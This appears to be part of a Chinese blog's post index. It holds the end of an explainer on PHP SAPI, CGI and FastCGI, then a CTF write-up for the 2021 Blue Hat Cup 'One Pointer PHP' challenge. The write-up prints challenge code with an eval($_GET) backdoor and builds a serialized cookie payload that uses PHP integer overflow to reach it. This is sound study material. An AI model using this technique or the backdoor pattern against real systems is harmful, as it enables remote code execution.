<p>可以看出sapi是一个中间过程 sapi提供了一个和外部通信的接口，使得PHP可以和其他应用进行交互数据（apache，nginx等）。php默认提供了很多种sapi，常见的提供给apache和nginx的php5_module、CGI、FastCGI，给IIS的ISAPI，以及Shell的CLI。（httpd是Apache超文本传输协议(HTTP)服务器的主程序。被设计为一个独立运行的后台进程，它会建立一个处理请求的子进程或线程池）</p>
<p>所以，以上的apache调用php执行的过程如下：</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">apache -&gt; httpd -&gt; php5_module -&gt; sapi -&gt; php</span><br></pre></td></tr></table></figure>

<p>这种模式将ogo安装到apache中 每一次apache请求都会产生一条进程 这个进程就完整的包括php的各种运算记算等操作</p>
<p>在上图中 apache每接收一个请求 都会生成一个进程来连接php 但是如果在同一时间点上收到了大量的请求（用户过多产生的问题 听起来有点像dos）服务器就会承受不住而崩溃 而且把php当作一个module加载到apache中 出问题时很难确定时php的问题还是服务器的问题</p>
<h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>在整个网站架构中，Web服务器只是内容的分发者 举个例子 如果客户端请求的是index,html 那么Web Server会去文件系统中找到这个文件 发送给浏览器 这里分发的是静态数据</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220426141324714.png" alt="image-20220426141324714"></p>
<p>如果请求的是index.php 根据配置文件 服务器知道这个不是静态文件 需要找php解析器来处理 那么他会把这个请求简单处理 交给php解析器</p>
<p><img src="https://s2.loli.net/2022/04/26/NvO7WsjLlT5C1KY.png" alt="image-20220426141449993"></p>
<p>当服务器收到index,php在收到index,php这个请求之后 会启动对应的CGI程序 这里就是php的解析器 接下来php解析器会解析php.ini文件 初始化执行环境 然后处理请求 再以规定CGI规定的格式返回处理后的结果 退出进程 服务器再把结果返回给浏览器 这就是一个完整的动态PHP Web访问流程 所以引出这几个词</p>
<p><strong>CGI</strong>：是 Web Server 与 Web Application 之间数据交换的一种协议。</p>
<p><strong>FastCGI</strong>：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。</p>
<p><strong>PHP-CGI</strong>：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。</p>
<p><strong>PHP-FPM</strong>：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。</p>
<p>（Web Server 一般指Apache、Nginx、IIS、Tomcat等服务器，Web Application 一般指PHP、Java、Asp.net等应用程序） </p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>1、****CGI</strong></p>
<p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。</p>
<p>WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。也就是说，CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。（cgi程序，你就可以理解成遵循cgi协议编写的程序）</p>
<p><strong>优点：</strong></p>
<p>CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给web服务器和web应用(如提nginx和php)。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少他们两个的关联，使他们变得更独立。</p>
<p><strong>缺点：</strong></p>
<p>但是CGI有个难受的地方，就是<strong>每一次</strong>web请求都会有启动和退出过程，也就是最为人诟病的fork-and-execute模式，这样一在大规模并发下，就死翘翘了。 </p>
<p><strong>2、FastCGI</strong></p>
<p>从根本上来说，FastCGI是用来提高CGI程序性能的。类似于CGI，FastCGI也可以说是一种协议。</p>
<p>FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。</p>
<p>FastCGI是和语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。</p>
<p><strong>举例：</strong></p>
<p>当web server收到/index.php请求，看一下CGI程序和FastCGI程序分别是怎么处理的：</p>
<p><strong>CGI：</strong>当收到web server请求后，会启动对应的CGI程序，这里就是PHP的解析器（php-cgi）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定的CGI规定的格式返回处理后的结果，退出进程。（CGI每次接收到请求都会执行这些步骤）</p>
<p><strong>FastCGI：</strong>首先，FastCGI程序会先启动一个master，解析配置环境，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源，这就是fastcgi对进程的管理。（CGI程序和FastCGI程序，可以理解成遵循CGI协议和FastCGI协议编写的程序）</p>
<p>FastCGI的工作原理：</p>
<p>FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。 </p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220426143223300.png" alt="image-20220426143223300"></p>
<p>（1）Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p>
<p>（2）FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p>
<p>（3）当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
<p>（4）FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。</p>
<p>自己总结的fastcgi工作进程</p>
<p>1.服务器启动 初始化fastcgi管理器</p>
<p>2.fastcgi管理器自身初始化 创建多个fastcgi子进程 比如php-cgi/php-FPM</p>
<p>3.客户端发送请求 比如index.php 服务端收到请求后由fastcgi管理器选择一个子进程（php-cgi）并传输解析index.php所需的环境及变量等</p>
<p>4.子进程php-cgi进行环境配置并解析</p>
<p>5.子进程php-cgi将解析后的输出以及报错结果返回服务端 服务端返回客户端进行回显</p>
<p>6.子进程php-cgi结束进程 断开与fastcgi的连接 停止工作 fastcgi管理器接受下一个服务端请求 并再次执行以上操作 </p>
<p>可以发现如果有较多请求同时处理 因为有很多php-cgi 所以服务端不会因请求量过大而崩溃 这就是fastcgi多进程的号出 但采取了空间换时间的方法 消耗了更多的服务器内存</p>
<p>CGI与FastCGI比较：</p>
<p>（1）对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
<p>（2）由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。 </p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>CGI</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯 2021 One Pointer PHP</title>
    <url>/2022/04/24/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/</url>
    <content><![CDATA[<p>打开题拿源码 </p>
<p>add_api.php</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>user.php</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="第一个点-php数组溢出"><a href="#第一个点-php数组溢出" class="headerlink" title="第一个点 php数组溢出"></a>第一个点 php数组溢出</h3><p>审计源码 想执行backdoor 第一个if可以不用管 这里注意是=赋值运算符 不是==比较运算符</p>
<p>第五行由于给$count[]赋值为1 永真 要让if条件为假才能进入eval</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>PHP的int型数据取值范围，与操作系统相关，32位系统上为2的31次方，即-2147483648到2147483647，64位系统上为2的63次方，即-9223372036854775808到9223372036854775807。当key等于PHP int类型数据的最大值时，想要再插入一个更大的值便会造成溢出导致出现Warning</p>
<p>并且php数组还有一个特性 如果数组键名为空 那么就在已有键名自增一次作为键名 如果自增结果大于int上限值 赋值就会失败</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220424214731896.png" alt="image-20220424214731896"></p>
<p><img src="https://s2.loli.net/2022/04/24/5jOXeQmIwdDh1Up.png" alt="image-20220424215012644"></p>
<p>所以这里的键名要为9223372036854775807 也就是说$user-&gt;count要为9223372036854775806</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>这里可以通过修改$_COOKIE[data]的值来修改$user 的类变量</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>=<span class="number">9223372036854775806</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span></span><br></pre></td></tr></table></figure>

<p>修改Cookie为  </p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">data = O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>User%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>count%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A9223372036854775806%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>在源码页面构造个phpinfo()看一下 成功绕过</p>
<p><img src="https://s2.loli.net/2022/04/24/kge6nv1tZl3FOAN.png" alt="image-20220424215950164"></p>
]]></content>
      <categories>
        <category>web</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
</search>
